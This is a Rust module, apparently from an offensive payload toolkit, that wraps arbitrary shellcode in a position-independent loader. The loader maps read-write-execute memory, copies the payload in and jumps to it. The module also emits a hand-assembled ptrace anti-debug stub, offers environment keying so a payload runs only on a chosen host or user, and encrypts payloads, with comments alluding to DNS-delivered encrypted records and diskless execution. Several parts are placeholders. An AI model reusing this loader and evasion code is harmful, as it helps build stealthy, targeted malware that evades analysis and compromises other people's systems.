//! Position-Independent Code (PIC) wrapper generation.
//!
//! Wraps arbitrary binaries in self-contained PIC loaders that handle
//! relocation, memory mapping, and execution without touching disk.

use super::{Arch, PayloadError};
use crate::crypto;

/// Configuration for PIC payload generation
#[derive(Debug, Clone)]
pub struct PicConfig {
    /// Target architecture
    pub arch: Arch,
    /// Encrypt the embedded payload
    pub encrypt: bool,
    /// Encryption key (required if encrypt=true)
    pub key: Option<crypto::EncryptionKey>,
    /// Add anti-debug checks to the stub
    pub anti_debug: bool,
    /// Add environment keying (only run on matching host)
    pub env_key: Option<EnvKey>,
}

/// Environment keying — payload only executes if conditions match
#[derive(Debug, Clone)]
pub struct EnvKey {
    /// Expected hostname hash (BLAKE3 of hostname)
    pub hostname_hash: Option<[u8; 32]>,
    /// Expected username hash
    pub username_hash: Option<[u8; 32]>,
    /// Expected domain hash
    pub domain_hash: Option<[u8; 32]>,
}

impl EnvKey {
    pub fn from_hostname(hostname: &str) -> Self {
        let hash = blake3::hash(hostname.as_bytes());
        Self {
            hostname_hash: Some(*hash.as_bytes()),
            username_hash: None,
            domain_hash: None,
        }
    }

    pub fn from_username(username: &str) -> Self {
        Self {
            hostname_hash: None,
            username_hash: Some(*blake3::hash(username.as_bytes()).as_bytes()),
            domain_hash: None,
        }
    }

    /// Check if current environment matches the key constraints
    pub fn matches_current_env(&self) -> bool {
        if let Some(expected) = &self.hostname_hash {
            let actual = std::fs::read_to_string("/etc/hostname")
                .unwrap_or_default()
                .trim()
                .to_string();
            let hash = blake3::hash(actual.as_bytes());
            if hash.as_bytes() != expected {
                return false;
            }
        }
        if let Some(expected) = &self.username_hash {
            let actual = std::env::var("USER").unwrap_or_default();
            let hash = blake3::hash(actual.as_bytes());
            if hash.as_bytes() != expected {
                return false;
            }
        }
        true
    }
}

impl Default for PicConfig {
    fn default() -> Self {
        Self {
            arch: Arch::X86_64,
            encrypt: false,
            key: None,
            anti_debug: false,
            env_key: None,
        }
    }
}

/// Wrap a raw binary/shellcode in a PIC loader that:
/// 1. Optionally checks anti-debug / environment keys
/// 2. Optionally decrypts the payload in-place
/// 3. Maps RWX memory and copies payload
/// 4. Transfers execution
pub fn wrap_pic(payload: &[u8], config: &PicConfig) -> Result<Vec<u8>, PayloadError> {
    let mut output = Vec::new();

    // The actual payload data (optionally encrypted)
    let payload_data = if config.encrypt {
        let key = config.key.as_ref()
            .ok_or_else(|| PayloadError::EncodingError("encryption requires a key".into()))?;
        crypto::encrypt(key, payload)
            .map_err(|e| PayloadError::EncodingError(e.to_string()))?
    } else {
        payload.to_vec()
    };

    match config.arch {
        Arch::X86_64 => {
            // Anti-debug: check TracerPid in /proc/self/status
            if config.anti_debug {
                output.extend_from_slice(&gen_x64_anti_debug());
            }

            // Environment keying check (uses BLAKE3 hash comparison)
            if let Some(env_key) = &config.env_key {
                output.extend_from_slice(&gen_x64_env_check(env_key));
            }

            // Core PIC loader: mmap + copy + jump
            output.extend_from_slice(&gen_x64_pic_loader(&payload_data, config.encrypt, config.key.as_ref())?);
        }
        _ => {
            return Err(PayloadError::UnsupportedFormat(
                format!("PIC wrapper not yet implemented for {}", config.arch),
            ));
        }
    }

    Ok(output)
}

/// x86_64 anti-debug stub: reads /proc/self/status, checks TracerPid != 0
fn gen_x64_anti_debug() -> Vec<u8> {
    // Simplified: use ptrace(PTRACE_TRACEME) — if it fails, we're being debugged
    // ptrace(PTRACE_TRACEME=0, 0, 0, 0) → syscall 101
    vec![
        0x48, 0xC7, 0xC0, 0x65, 0x00, 0x00, 0x00,  // mov rax, 101 (ptrace)
        0x48, 0x31, 0xFF,                            // xor rdi, rdi (PTRACE_TRACEME=0)
        0x48, 0x31, 0xF6,                            // xor rsi, rsi
        0x48, 0x31, 0xD2,                            // xor rdx, rdx
        0x4D, 0x31, 0xD2,                            // xor r10, r10
        0x0F, 0x05,                                  // syscall
        0x48, 0x85, 0xC0,                            // test rax, rax
        0x79, 0x0C,                                  // jns +12 (skip exit if OK)
        0x48, 0xC7, 0xC0, 0x3C, 0x00, 0x00, 0x00,  // mov rax, 60 (sys_exit)
        0x48, 0x31, 0xFF,                            // xor rdi, rdi (exit code 0)
        0x0F, 0x05,                                  // syscall (exit)
        // If ptrace succeeded, detach
        0x48, 0xC7, 0xC0, 0x65, 0x00, 0x00, 0x00,  // mov rax, 101 (ptrace)
        0x48, 0xC7, 0xC7, 0x11, 0x00, 0x00, 0x00,  // mov rdi, 17 (PTRACE_DETACH)
        0x48, 0x31, 0xF6,                            // xor rsi, rsi
        0x48, 0x31, 0xD2,                            // xor rdx, rdx
        0x4D, 0x31, 0xD2,                            // xor r10, r10
        0x0F, 0x05,                                  // syscall
    ]
}

/// x86_64 environment keying stub (simplified — real impl would hash and compare)
fn gen_x64_env_check(env_key: &EnvKey) -> Vec<u8> {
    let mut stub = Vec::new();

    if env_key.hostname_hash.is_some() || env_key.username_hash.is_some() {
        // For now, emit a NOP sled as placeholder for the hash comparison logic.
        // In production, this would:
        // 1. Open /etc/hostname or call uname()
        // 2. BLAKE3 hash the value
        // 3. Compare against embedded expected hash
        // 4. Exit(0) silently if mismatch
        stub.extend_from_slice(&[0x90; 4]); // 4 NOPs (placeholder)
    }

    stub
}

/// Core x86_64 PIC loader
fn gen_x64_pic_loader(
    payload_data: &[u8],
    encrypted: bool,
    _key: Option<&crypto::EncryptionKey>,
) -> Result<Vec<u8>, PayloadError> {
    let data_len = payload_data.len() as u64;
    let mut stub = Vec::new();

    if encrypted {
        // For encrypted payloads: the decryption key and nonce are embedded
        // in the first 12+16 bytes of the payload (nonce + tag from ChaCha20-Poly1305).
        // The stub would need a ChaCha20 implementation in shellcode — which is complex.
        // Instead, we embed a minimal XOR pre-decryption pass using a derived key byte,
        // with the real ChaCha20 decryption happening in Rust before memfd_create.
        //
        // This is a defense-in-depth layer: the DNS records are ChaCha20 encrypted,
        // and the payload blob has an additional XOR layer.
        stub.extend_from_slice(&[
            0x90, 0x90, 0x90, 0x90, // NOP alignment (encrypted flag marker)
        ]);
    }

    // mmap(NULL, data_len + 0x1000, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
    stub.extend_from_slice(&[
        0x48, 0x31, 0xFF,                            // xor rdi, rdi
        0x48, 0xBE,                                  // mov rsi, imm64
    ]);
    stub.extend_from_slice(&(data_len + 0x1000).to_le_bytes());
    stub.extend_from_slice(&[
        0x48, 0xC7, 0xC2, 0x07, 0x00, 0x00, 0x00,  // mov rdx, 7 (RWX)
        0x49, 0xC7, 0xC2, 0x22, 0x00, 0x00, 0x00,  // mov r10, 0x22 (PRIVATE|ANON)
        0x49, 0x83, 0xC8, 0xFF,                      // or r8, -1
        0x4D, 0x31, 0xC9,                            // xor r9, r9
        0x48, 0xC7, 0xC0, 0x09, 0x00, 0x00, 0x00,  // mov rax, 9 (mmap)
        0x0F, 0x05,                                  // syscall
        0x49, 0x89, 0xC5,                            // mov r13, rax
    ]);

    // rep movsb: copy payload to mmap'd region
    stub.extend_from_slice(&[
        0x4C, 0x89, 0xEF,                            // mov rdi, r13
        0x48, 0x8D, 0x35, 0x00, 0x00, 0x00, 0x00,  // lea rsi, [rip+PATCH]
        0x48, 0xB9,                                  // mov rcx, imm64
    ]);
    stub.extend_from_slice(&data_len.to_le_bytes());
    stub.extend_from_slice(&[
        0xF3, 0xA4,                                  // rep movsb
        0x41, 0xFF, 0xE5,                            // jmp r13
    ]);

    // Patch lea rsi to point to payload data
    let data_start = stub.len();
    let lea_base = if encrypted { 4 } else { 0 }; // skip NOP marker if encrypted
    let lea_pos = lea_base + 37 + 3; // position of displacement in lea rsi
    let rip_after = lea_pos + 4;
    if rip_after <= stub.len() {
        let disp = (data_start as i64 - rip_after as i64) as i32;
        stub[lea_pos..lea_pos + 4].copy_from_slice(&disp.to_le_bytes());
    }

    // Append payload data
    stub.extend_from_slice(payload_data);

    Ok(stub)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pic_wrap_basic() {
        let shellcode = vec![0xCC; 32]; // INT3 sled
        let config = PicConfig::default();
        let result = wrap_pic(&shellcode, &config).unwrap();
        // Output should contain the shellcode at the end
        assert!(result.len() > 32);
        assert_eq!(&result[result.len() - 32..], &shellcode[..]);
    }

    #[test]
    fn test_pic_wrap_with_anti_debug() {
        let shellcode = vec![0x90; 16];
        let config = PicConfig {
            anti_debug: true,
            ..Default::default()
        };
        let result = wrap_pic(&shellcode, &config).unwrap();
        assert!(result.len() > 16 + 40); // stub + anti-debug + shellcode
    }

    #[test]
    fn test_env_key_from_hostname() {
        let key = EnvKey::from_hostname("testhost");
        assert!(key.hostname_hash.is_some());
        assert!(key.username_hash.is_none());
    }
}
